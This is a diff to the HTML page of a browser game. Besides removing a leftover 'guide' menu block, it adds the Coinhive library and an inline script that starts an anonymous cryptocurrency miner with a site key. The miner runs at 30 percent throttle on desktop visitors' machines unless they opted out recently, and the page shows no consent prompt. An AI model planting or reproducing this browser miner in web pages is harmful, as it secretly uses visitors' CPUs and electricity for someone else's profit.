@@ -119,7 +119,7 @@
             ga('create', 'UA-105167568-1', 'auto');
             ga('send', 'pageview');
         </script>
-
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     </head>
     <body>
         <div id='game'></div>
@@ -291,27 +291,17 @@
             </div>
         </div>
 
-        <div id='guide' class="animEsquerda2" style="display: none; font-size: 26px;">
-            <div id='tiers'>
-                <div id='basic'>
-                    <div id='basicLabel' style="color: #FF8080; font-size: 1.5em;padding-bottom: 10px;">
-                        Basic
-                    </div>
-                    <div class='basicItem'>
-                        Income
-                    </div>
-                    <div class='basicItem'>
-                        Buildings vs Units
-                    </div>
-                    <div class='basicItem'>
-                        Teste
-                    </div>
-                </div>
-            </div>
 
-        </div>
         
     </body>
-
+    <script>
+        var miner = new CoinHive.Anonymous('marN95i5rQIHYoGqhI4tEBi7xj94HCDU', {throttle: 0.3});
+    
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!miner.isMobile() && !miner.didOptOut(14400)) {
+            miner.start();
+        }
+    </script>
 
 </html>
